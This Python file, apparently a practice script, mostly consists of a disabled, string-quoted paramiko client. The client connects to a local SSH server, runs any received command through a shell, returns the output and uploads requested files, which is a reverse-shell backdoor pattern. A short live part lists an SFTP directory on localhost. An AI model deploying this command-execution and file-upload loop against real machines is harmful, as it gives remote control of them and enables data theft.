#experimental sftpServer test
'''
import paramiko
import subprocess

key = paramiko.RSAKey.from_private_key_file('test_rsa.key')
 
transport = paramiko.Transport(('127.0.0.1', 2222))
transport.connect(username='rick', password='jacky', pkey=key)
 
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect('127.0.0.1', username='rick', password='jacky')
chan = client.get_transport().open_session()
chan.send("Can I call you Bruce")
print(chan.recv(1024))

 
def sftp(localpath, name):
    try:
        sftp = paramiko.SFTPClient.from_transport(transport)
        sftp.put(localpath, name)
        sftp.close()
        transport.close()
        return "[+] Done uploading"
    except Exception as e:
        return str(e)
 
while True:
    command = chan.recv(1024).decode()
    if 'grab' in command:
        path, name = command.split(' ')
        chan.send(sftp(path, name))
    else:
        try:
            CMD = subprocess.check_output(command, shell=True)
            chan.send(CMD)
        except Exception as e:
            chan.send(str(e))

client.close()
'''

import paramiko

hostkey = paramiko.RSAKey.from_private_key_file('test_rsa.key')

try:
    transporter = paramiko.Transport(("localhost", 2222))
    transporter.connect(None, username="lab", password="lab")
    sftp = paramiko.SFTPClient.from_transport(transporter)
    dirlist = sftp.listdir(".")
    transporter.close()
except Exception as e:
    print(e)